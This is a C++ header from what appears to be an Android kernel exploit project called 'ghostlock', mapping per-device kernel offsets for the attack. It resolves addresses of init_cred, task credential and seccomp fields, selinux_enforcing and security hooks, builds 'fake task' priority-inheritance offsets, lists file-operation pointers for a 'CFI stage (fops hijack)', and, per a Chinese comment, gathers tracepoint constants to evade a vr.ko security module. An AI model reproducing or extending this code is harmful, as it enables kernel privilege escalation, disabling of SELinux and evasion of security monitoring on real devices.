#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "profile/model.h"
#include "session/exploit_session.hpp"

namespace ghostlock::profile {
    /* Value from the loaded profile, falling back to the compile-time default. */
    inline uint32_t symbol_or_default(uint32_t value, uint32_t fallback) {
        return ghostlock::session::g_exploit_session.profile.or_default(value, fallback);
    }

    /* The transport is split into objects (wire v2), so a field is read through
     * a getter rather than a kernel_offsets member pointer. */
    template<typename F>
    inline uint32_t symbol_u32(F get, uint32_t fallback) {
        const kernel_offsets *values = ghostlock::session::g_exploit_session.profile.values();
        return symbol_or_default(values ? static_cast<uint32_t>(get(*values)) : 0,
                                 fallback);
    }

    /* Same contract as symbol_u32, for the 64-bit kernel-section fields. */
    template<typename F>
    inline uint64_t symbol_u64(F get, uint64_t fallback) {
        const kernel_offsets *values = ghostlock::session::g_exploit_session.profile.values();
        return values ? get(*values) : fallback;
    }

    template<typename F>
    inline uint64_t symbol_image(F get, uint64_t fallback) {
        return ghostlock::kernel::KIMAGE_TEXT_BASE +
               static_cast<uint64_t>(symbol_u32(get, static_cast<uint32_t>(fallback)));
    }

    inline uintptr_t init_task() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.init_task; },
            ghostlock::kernel::INIT_TASK_OFF);
    }

    inline uintptr_t init_cred() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.init_cred; },
            ghostlock::kernel::INIT_CRED_OFF);
    }

    inline uintptr_t empty_zero_page() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.empty_zero_page; }, 0);
    }

    inline uintptr_t root_task_group() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.root_task_group; },
            ghostlock::kernel::ROOT_TASK_GROUP_OFF);
    }

    inline uintptr_t selinux_enforcing() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.selinux_enforcing; },
            ghostlock::kernel::SELINUX_ENFORCING_OFF);
    }

    inline uintptr_t selinux_blob_sizes() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.selinux_blob_sizes; },
            ghostlock::kernel::SELINUX_BLOB_SIZES_OFF);
    }

    inline uintptr_t security_hook_heads() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.security_hook_heads; },
            ghostlock::kernel::SECURITY_HOOK_HEADS_OFF);
    }

    inline uintptr_t slide_nfulnl_logger_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_nfulnl_logger; },
            ghostlock::kernel::SLIDE_NFULNL_LOGGER_OFF);
    }

    inline uintptr_t slide_loggers_0_1_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_loggers_0_1; },
            ghostlock::kernel::SLIDE_LOGGERS_0_1_OFF);
    }

    inline uintptr_t slide_random_boot_id_data_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_boot_id; },
            ghostlock::kernel::SLIDE_RANDOM_BOOT_ID_DATA_OFF);
    }

    inline uintptr_t slide_init_task_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.init_task; },
            ghostlock::kernel::INIT_TASK_OFF);
    }

    inline uintptr_t slide_root_task_group_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.root_task_group; },
            ghostlock::kernel::ROOT_TASK_GROUP_OFF);
    }

    inline uintptr_t slide_sysctl_bootid_image() {
        return symbol_image(
            [](const kernel_offsets &v) { return v.offsets.slide_boot_id; },
            ghostlock::kernel::SLIDE_SYSCTL_BOOTID_OFF);
    }

    inline uint32_t fake_task_prio_off() {
        return symbol_u32([](const kernel_offsets &v) { return v.task.prio; }, 0x94);
    }

    inline uint32_t fake_task_normal_prio_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.normal_prio; }, 0x9C);
    }

    inline uint32_t fake_task_task_group_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.sched_task_group; }, 0x420);
    }

    inline uint32_t fake_task_pi_lock_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.pi_lock; }, 0x9EC);
    }

    inline uint32_t fake_task_pi_waiters_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.pi_waiters; }, 0xA00);
    }

    inline uint32_t fake_task_pi_top_task_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.pi_top_task; }, 0xA10);
    }

    inline uint32_t fake_task_pi_blocked_on_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.pi_blocked_on; }, 0xA18);
    }

    inline uint32_t task_pid_off() {
        return symbol_u32([](const kernel_offsets &v) { return v.task.pid; }, 0x708);
    }

    inline uint32_t task_tgid_off() {
        return symbol_u32([](const kernel_offsets &v) { return v.task.tgid; }, 0x70C);
    }

    inline uint32_t task_atomic_flags_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.atomic_flags; }, 0x6C8);
    }

    inline uint32_t task_real_cred_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.real_cred; }, 0x8F8);
    }

    inline uint32_t task_cred_off() {
        return symbol_u32([](const kernel_offsets &v) { return v.task.cred; }, 0x900);
    }

    inline uint32_t task_comm_off() {
        return symbol_u32([](const kernel_offsets &v) { return v.task.comm; }, 0x910);
    }

    inline uint32_t task_tasks_off() {
        return symbol_u32([](const kernel_offsets &v) { return v.task.tasks; }, 0x638);
    }

    inline uint32_t task_seccomp_off() {
        return symbol_u32(
            [](const kernel_offsets &v) { return v.task.seccomp; }, 0x9C8);
    }

    /* ---------------------------------------------------------------------
 * CFI stage (fops hijack) per-kernel constants, all absent by default: a
 * device without them reports 0 and the CFI stage refuses to run rather than
 * writing a guessed address. Values come from the profile `kernel` section.
 * ------------------------------------------------------------------- */
    inline uintptr_t ashmem_misc_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemMiscOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_misc_fops_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemMiscFopsOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_fops_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemFopsOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_ioctl_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemIoctlOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_compat_ioctl_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemCompatIoctlOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_mmap_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemMmapOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_open_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemOpenOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_release_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemReleaseOff.value_or(0);
        }, 0);
    }

    inline uintptr_t ashmem_show_fdinfo_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.ashmemShowFdinfoOff.value_or(0);
        }, 0);
    }

    inline uintptr_t configfs_read_iter_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.configfsReadIterOff.value_or(0);
        }, 0);
    }

    inline uintptr_t configfs_bin_read_iter_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.configfsBinReadIterOff.value_or(0);
        }, 0);
    }

    inline uintptr_t configfs_bin_write_iter_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.configfsBinWriteIterOff.value_or(0);
        }, 0);
    }

    inline uintptr_t copy_splice_read_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.copySpliceReadOff.value_or(0);
        }, 0);
    }

    inline uintptr_t noop_llseek_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.noopLlseekOff.value_or(0);
        }, 0);
    }

    /* ---- 第三步：反 vr.ko 的 tracepoint 常量 ---- */
    inline uintptr_t sys_exit_tp_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.sysExitTpOff.value_or(0);
        }, 0);
    }

    inline uintptr_t rvh_commit_creds_tp_image() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.rvhCommitCredsTpOff.value_or(0);
        }, 0);
    }

    inline size_t tracepoint_probestub_off() {
        return static_cast<size_t>(symbol_u64([](const kernel_offsets &v) {
            return v.misc.tracepointProbestubOff.value_or(0);
        }, 0));
    }

    inline size_t tracepoint_funcs_off() {
        return static_cast<size_t>(symbol_u64([](const kernel_offsets &v) {
            return v.misc.tracepointFuncsOff.value_or(0);
        }, 0));
    }

    inline size_t tracepoint_func_stride() {
        return static_cast<size_t>(symbol_u64([](const kernel_offsets &v) {
            return v.misc.tracepointFuncStride.value_or(0);
        }, 0));
    }

    inline uint64_t vr_commit_to_sysexit_delta() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.vrCommitToSysexitDelta.value_or(0);
        }, 0);
    }

    /* 内核镜像的地址上界。profile 的 vr_kernel_image_max 只是量级上限，
     * 精确值应该用 boot.img 里 arm64 Image 头声明的 image_size；调用方在
     * 拿不到精确值时才退回这个。 */
    inline uint64_t vr_kernel_image_max() {
        return symbol_u64([](const kernel_offsets &v) {
            return v.misc.vrKernelImageMax.value_or(0);
        }, 0);
    }

    /* The `kernel` section keys the CFI stage cannot work without. */
    inline bool cfi_constants_present() {
        return ashmem_misc_fops_image() != 0 &&
               ashmem_fops_image() != 0 &&
               configfs_bin_read_iter_image() != 0 &&
               configfs_bin_write_iter_image() != 0 &&
               noop_llseek_image() != 0;
    }
} // namespace ghostlock::profile

#endif
